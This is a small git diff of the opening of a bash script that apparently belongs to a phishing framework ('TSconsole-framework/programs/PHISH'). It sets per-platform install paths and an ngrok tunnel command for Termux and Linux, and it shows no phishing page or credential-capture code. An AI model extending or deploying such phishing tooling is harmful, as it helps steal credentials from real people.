@@ -1,17 +1,19 @@
 #!/bin/bash
-PWD=$(pwd)
 #<<<----------DISTRO VERIFICATION---------->>>
 cd $HOME
 distro=$(pwd)
 if [[ $distro == '/data/data/com.termux/files/home' ]]; then
+	PWD='/data/data/com.termux/files/usr/share/TSconsole-framework/programs/PHISH/'
         Ngrok='termux-chroot ./ngrok'
 elif [[ $distro == '/data/data/hilled.pwnterm/files/usr/home' ]]; then
         printf "\e[1;31m Please switch on your mobile hotspot!!\e[0m\n"
 	Ngrok='./ngrok'
+        PWD='/data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/programs/PHISH/'
 else
         Ngrok='./ngrok'
+        PWD='/usr/share/TSconsole-framework/programs/PHISH/'
 fi
-cd $PWD
+cd ${PWD}
 #<<<---------banner---------->>>
 __banner__() {
 cat banner | pv -qL 300 | lolcat
